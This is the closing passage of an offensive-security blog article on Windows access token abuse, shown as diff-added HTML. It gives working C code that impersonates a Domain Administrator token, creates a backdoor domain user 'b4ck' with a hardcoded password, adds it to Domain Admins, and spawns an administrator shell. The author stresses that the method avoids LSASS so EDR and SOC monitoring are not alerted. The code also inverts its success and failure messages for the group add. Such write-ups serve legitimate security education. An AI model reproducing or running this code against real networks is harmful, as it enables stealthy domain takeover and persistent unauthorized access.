+<div class="highlight"><pre><span></span><span class="kt">bool</span><span class="w"> </span><span class="nf">getTokenUser</span><span class="p">(</span><span class="n">HANDLE</span><span class="w"> </span><span class="n">dupHandle</span><span class="p">,</span><span class="w"> </span><span class="kt">wchar_t</span><span class="o">*</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="kt">wchar_t</span><span class="o">*</span><span class="w"> </span><span class="n">domain</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">rtLength</span><span class="p">;</span>
+<span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">user_length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MAX_USERNAME_LENGTH</span><span class="p">;</span>
+<span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">domain_length</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MAX_DOMAINNAME_LENGTH</span><span class="p">;</span>
+<span class="w">    </span><span class="n">SID_NAME_USE</span><span class="w"> </span><span class="n">sid</span><span class="p">;</span>
+
+<span class="w">    </span><span class="n">GetTokenInformation</span><span class="p">(</span><span class="n">dupHandle</span><span class="p">,</span><span class="w"> </span><span class="n">TokenUser</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">rtLength</span><span class="p">);</span>
+<span class="w">    </span><span class="n">PTOKEN_USER</span><span class="w"> </span><span class="n">tInformation</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">PTOKEN_USER</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">rtLength</span><span class="p">);</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">tInformation</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">"Memory allocation error</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">FALSE</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">GetTokenInformation</span><span class="p">(</span><span class="n">dupHandle</span><span class="p">,</span><span class="w"> </span><span class="n">TokenUser</span><span class="p">,</span><span class="w"> </span><span class="n">tInformation</span><span class="p">,</span><span class="w"> </span><span class="n">rtLength</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">rtLength</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">free</span><span class="p">(</span><span class="n">tInformation</span><span class="p">);</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">FALSE</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">LookupAccountSidW</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">tInformation</span><span class="o">-&gt;</span><span class="n">User</span><span class="p">.</span><span class="n">Sid</span><span class="p">,</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">user_length</span><span class="p">,</span>
+<span class="w">        </span><span class="n">domain</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">domain_length</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">sid</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">free</span><span class="p">(</span><span class="n">tInformation</span><span class="p">);</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">FALSE</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="n">free</span><span class="p">(</span><span class="n">tInformation</span><span class="p">);</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">TRUE</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>Basically, this function extracts the username associated with the duplicated token. This allows us to compare it and determine whether the token belongs to the Administrator or not. </p><br/>
+<p>Nice, now let’s adapt our program to impersonate the Domain Administrator and add a new user to the domain, making it a Domain Admin.</p><br/>
+<div class="highlight"><pre><span></span><span class="kt">wchar_t</span><span class="w"> </span><span class="n">username</span><span class="p">[</span><span class="n">MAX_USERNAME_LENGTH</span><span class="p">];</span>
+<span class="kt">wchar_t</span><span class="w"> </span><span class="n">domain</span><span class="p">[</span><span class="n">MAX_USERNAME_LENGTH</span><span class="p">];</span>
+
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">getTokenUser</span><span class="p">(</span><span class="n">dupHandle</span><span class="p">,</span><span class="w"> </span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="n">domain</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[-] Getting token username failed"</span><span class="p">);</span>
+<span class="w">    </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">dupHandle</span><span class="p">);</span>
+<span class="w">    </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">process</span><span class="p">);</span>
+<span class="w">    </span><span class="k">continue</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">printf</span><span class="p">(</span><span class="s">"[+] User found: %ws</span><span class="se">\\</span><span class="s">%ws</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">domain</span><span class="p">,</span><span class="w"> </span><span class="n">username</span><span class="p">);</span>
+
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">wcscmp</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="sa">L</span><span class="s">"Administrator"</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="c1">// Not administrator, skipping.</span>
+<span class="w">    </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">dupHandle</span><span class="p">);</span>
+<span class="w">    </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">process</span><span class="p">);</span>
+<span class="w">    </span><span class="k">continue</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">wcscmp</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="sa">L</span><span class="s">"Administrator"</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="n">isPrimaryToken</span><span class="p">(</span><span class="n">dupHandle</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">isImpersonationLevel</span><span class="p">(</span><span class="n">dupHandle</span><span class="p">)))</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">adminToken</span><span class="p">;</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">DuplicateTokenEx</span><span class="p">(</span><span class="n">dupHandle</span><span class="p">,</span><span class="w"> </span><span class="n">TOKEN_ALL_ACCESS</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span>
+<span class="w">        </span><span class="n">SecurityImpersonation</span><span class="p">,</span><span class="w"> </span><span class="n">TokenPrimary</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">adminToken</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">dupHandle</span><span class="p">);</span>
+<span class="w">        </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">process</span><span class="p">);</span>
+<span class="w">        </span><span class="k">continue</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">ImpersonateLoggedOnUser</span><span class="p">(</span><span class="n">adminToken</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">"[-] An error occurred while impersonating Administrator"</span><span class="p">);</span>
+<span class="w">        </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">dupHandle</span><span class="p">);</span>
+<span class="w">        </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">process</span><span class="p">);</span>
+<span class="w">        </span><span class="k">continue</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="c1">// Create local user</span>
+<span class="w">    </span><span class="kt">wchar_t</span><span class="w"> </span><span class="n">newUser</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sa">L</span><span class="s">"b4ck"</span><span class="p">;</span>
+<span class="w">    </span><span class="k">const</span><span class="w"> </span><span class="kt">wchar_t</span><span class="w"> </span><span class="n">dcHostname</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sa">L</span><span class="s">"elswixcorp.local"</span><span class="p">;</span>
+<span class="w">    </span><span class="n">USER_INFO_1</span><span class="w"> </span><span class="n">ui</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">};</span>
+<span class="w">    </span><span class="n">ui</span><span class="p">.</span><span class="n">usri1_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">newUser</span><span class="p">;</span>
+<span class="w">    </span><span class="n">ui</span><span class="p">.</span><span class="n">usri1_password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">LPWSTR</span><span class="p">)</span><span class="sa">L</span><span class="s">"P4ssw0rd123!"</span><span class="p">;</span>
+<span class="w">    </span><span class="n">ui</span><span class="p">.</span><span class="n">usri1_priv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">USER_PRIV_USER</span><span class="p">;</span>
+<span class="w">    </span><span class="n">ui</span><span class="p">.</span><span class="n">usri1_flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">UF_SCRIPT</span><span class="p">;</span>
+
+<span class="w">    </span><span class="n">NET_API_STATUS</span><span class="w"> </span><span class="n">status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">NetUserAdd</span><span class="p">(</span><span class="n">dcHostname</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">LPBYTE</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ui</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">status</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">NERR_Success</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">"[-] User %ws was not created:</span><span class="se">\n</span><span class="s"> %d"</span><span class="p">,</span><span class="w"> </span><span class="n">newUser</span><span class="p">,</span><span class="w"> </span><span class="n">GetLastError</span><span class="p">());</span>
+<span class="w">        </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">process</span><span class="p">);</span>
+<span class="w">        </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">dupHandle</span><span class="p">);</span>
+<span class="w">        </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">adminToken</span><span class="p">);</span><span class="w"> </span>
+<span class="w">        </span><span class="k">break</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] User %ws added successfully</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">newUser</span><span class="p">);</span>
+
+<span class="w">    </span><span class="n">status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">NetGroupAddUser</span><span class="p">(</span><span class="n">dcHostname</span><span class="p">,</span><span class="w"> </span><span class="sa">L</span><span class="s">"Domain Admins"</span><span class="p">,</span><span class="w"> </span><span class="n">newUser</span><span class="p">);</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">status</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">NERR_Success</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] User successfully added to Domain Admins group</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">"[-] Something went wrong!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+<p>As you can see, this code is pretty similar to what we did earlier to add a new local administrator user. The main difference is that now we’re impersonating the Domain Administrator, and this time we also need to specify the server, in our case, the domain name. </p><br/>
+<p>Now, let's run the program:</p><br/>
+<p><img alt="" src="https://elswix.github.io/articles/20/img/Tokens18.png"/></p><br/>
+<p>It looks like it worked. Let’s check if we can authenticate against the DC:</p><br/>
+<p><img alt="" src="https://elswix.github.io/articles/20/img/Tokens19.png"/></p><br/>
+<p>Great! We’ve successfully created a new domain user and added it to the Domain Admins group.</p><br/>
+<p>There are many other approaches you could try to compromise the domain, so feel free to explore them on your own!</p><br/>
+<h3>Creating Process as Domain Admin</h3><br/>
+<p>Well, at this point we’ve already pwned the domain, but I want to show you something interesting.  What if, instead of creating a new domain user, we want to start a <code>cmd</code> on the workstation, just like we did earlier with <code>NT AUTHORITY\SYSTEM</code>?</p><br/>
+<p>Let’s try opening a <code>cmd</code> using <code>CreateProcessWithToken</code>, which is a bit easier to work with. Here’s the code:</p><br/>
+<div class="highlight"><pre><span></span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">wcscmp</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="sa">L</span><span class="s">"Administrator"</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="n">isPrimaryToken</span><span class="p">(</span><span class="n">dupHandle</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">isImpersonationLevel</span><span class="p">(</span><span class="n">dupHandle</span><span class="p">)))</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">    </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">adminToken</span><span class="p">;</span>
+<span class="w">    </span><span class="n">STARTUPINFO</span><span class="w"> </span><span class="n">si</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">};</span>
+<span class="w">    </span><span class="n">PROCESS_INFORMATION</span><span class="w"> </span><span class="n">pi</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">};</span><span class="w"> </span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">DuplicateTokenEx</span><span class="p">(</span><span class="n">dupHandle</span><span class="p">,</span><span class="w"> </span><span class="n">TOKEN_ALL_ACCESS</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span>
+<span class="w">        </span><span class="n">SecurityImpersonation</span><span class="p">,</span><span class="w"> </span><span class="n">TokenPrimary</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">adminToken</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">dupHandle</span><span class="p">);</span>
+<span class="w">        </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">process</span><span class="p">);</span>
+<span class="w">        </span><span class="k">continue</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="n">CreateProcessWithTokenW</span><span class="p">(</span><span class="n">adminToken</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="sa">L</span><span class="s">"C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">cmd.exe"</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">si</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+<p>Now, let's run it: </p><br/>
+<p><img alt="" src="https://elswix.github.io/articles/20/img/Tokens20.png"/></p><br/>
+<p>At first glance, it looks like it worked… but why is it showing just a black window?</p><br/>
+<p>That’s exactly what I wanted to show you. This happens because of some environment configuration related to the token, specifically, the differences between the session that belongs to the Administrator account and the one we’re currently running in. This only applies to GUI access. If you’re launching a console-only process, you can usually proceed without any further issues.</p><br/>
+<p>Let’s try it again, this time using <code>CreateProcessAsUser</code>, and change the token <code>SessionId</code> to match our own to see if that fixes the issue.<br/>
+However, as I mentioned before, modifying the token <code>SessionId</code> has to be done using <code>SetTokenInformation</code>. The catch is that changing the <code>SessionId</code> of a token requires the <strong>Act as part of the operating system</strong> privilege (<code>SeTcbPrivilege</code>).</p><br/>
+<p>On top of that, <code>CreateProcessAsUser</code> also requires a couple of extra privileges, which we already talked about earlier: <code>SeAssignPrimaryTokenPrivilege</code> and <code>SeIncreaseQuotaPrivilege</code>.</p><br/>
+<p>The important detail here is that <code>SeTcbPrivilege</code> is <strong>not</strong> granted to local administrators. Only <code>NT AUTHORITY\SYSTEM</code> has it.<br/>
+So the plan is the following: first, we impersonate SYSTEM. Then, while running as SYSTEM, we look for the administrator token and call both <code>SetTokenInformation</code> and <code>CreateProcessAsUser</code>. For <code>CreateProcessAsUser</code>, we still specify the administrator token, we’re just doing the heavy lifting while impersonating SYSTEM.</p><br/>
+<p>Now, let's run it:</p><br/>
+<p><img alt="" src="https://elswix.github.io/articles/20/img/Tokens21.png"/></p><br/>
+<p>The same happens, so it’s not just the token <code>SessionId</code>. Even after changing it with <code>SetTokenInformation</code>, the issue remains. The real problem is that Windows doesn’t automatically grant access to the <strong>interactive window station and desktop</strong> when a process is created with <code>CreateProcessAsUser</code>.</p><br/>
+<p>So while the process is running in the correct session, it still lacks the proper permissions to fully interact with the desktop. Because of that, the window gets created but can’t properly render its UI, which is why we only see a blank or black window instead of a usable <code>cmd</code>. </p><br/>
+<p>You could try to circumvent this by changing the window station ACEs, as mentioned in this <a href="https://stackoverflow.com/questions/21716527/in-windows-how-do-you-programatically-launch-a-process-in-administrator-mode-un/21718198#21718198">StackOverflow question</a>. However, there’s an even easier alternative: instead of opening a new console, you can just run it in the <strong>same PowerShell window</strong>.</p><br/>
+<p>Here’s what you need to update:</p><br/>
+<div class="highlight"><pre><span></span><span class="n">DWORD</span><span class="w"> </span><span class="n">createFlags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CREATE_UNICODE_ENVIRONMENT</span><span class="p">;</span>
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">CreateProcessAsUserW</span><span class="p">(</span><span class="n">adminToken</span><span class="p">,</span><span class="w"> </span><span class="sa">L</span><span class="s">"C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">cmd.exe"</span><span class="p">,</span>
+<span class="w">                         </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">TRUE</span><span class="p">,</span><span class="w"> </span><span class="n">createFlags</span><span class="p">,</span>
+<span class="w">                         </span><span class="n">hEnvironment</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">si</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">pi</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[!] CreateProcessAsUser failed: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">GetLastError</span><span class="p">());</span>
+<span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] Administrator shell spawned successfully!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="w">    </span><span class="c1">// Needed for opening in current console</span>
+<span class="w">    </span><span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>
+<span class="w">    </span><span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span><span class="w"> </span><span class="n">INFINITE</span><span class="p">);</span>
+<span class="w">    </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">);</span>
+<span class="w">    </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+<p><a href="https://gist.githubusercontent.com/elswix/b37a16ddbb85ae9bf541f31b882a9cd1/raw/a0d34fc681c47a1db98af57ad08b4ee1a96c3163/impersonateAdmin.cpp">Here is the complete code</a>.</p><br/>
+<p>Now, let’s run the program with the new changes:</p><br/>
+<p><img alt="" src="https://elswix.github.io/articles/20/img/Tokens22.png"/></p><br/>
+<p>Awesome! This time it worked by just opening in the current window. We’ve successfully obtained a shell as the domain administrator. Once again, this wouldn’t have been a problem if you didn’t need the GUI, but I’m just showing it in case you want to learn how to handle it.</p><br/>
+<p>As mentioned at the beginning of the article, this technique is particularly useful when an EDR is installed and a SOC team is monitoring the environment, because it allows us to impersonate a domain user without touching LSASS, which would otherwise have triggered alerts.</p><br/>
+<h3>Conclusion</h3><br/>
+<p>Throughout this article, we’ve seen that <em>Windows Access Tokens</em> are far more than an internal implementation detail. They are the core mechanism Windows uses to decide <strong>who</strong> can do <strong>what</strong>, and under <strong>which security context</strong>. Understanding how tokens are created, what information they carry, and how <em>Primary Tokens</em> differ from <em>Impersonation Tokens</em> completely changes the way we look at many privilege escalation techniques that are often used almost mechanically.</p><br/>
+<p>By digging into privileges like <strong>SeImpersonatePrivilege</strong>, it becomes clear that tools such as <em>PrintSpoofer</em>, <em>GodPotato</em>, or <em>JuicyPotato</em> are not “breaking” Windows. Instead, they abuse perfectly legitimate authentication and impersonation flows that exist for services to function properly. The weakness is not the token itself, but how easily a privileged process can be coerced into authenticating to an attacker-controlled endpoint and handing over a powerful token in the process.</p><br/>
+<p>The key takeaway is that exploiting without understanding quickly becomes a limitation. Once you truly grasp what’s happening under the hood, how Windows creates, filters, and reuses access tokens, you stop relying blindly on exploits and start reasoning about scenarios, adapting techniques, and spotting opportunities that would otherwise go unnoticed.</p><br/>
+<p>I hope you enjoyed this article and that you learned something valuable from it.</p><br/>
+<p>Happy Hacking!</p><br/>
+<p><strong>Joaquín (AKA elswix)</strong></p><br/>
+</div>
+</div>
+</section>
+            </main>
+        </div>
+    </div>
+</body>
+</html>
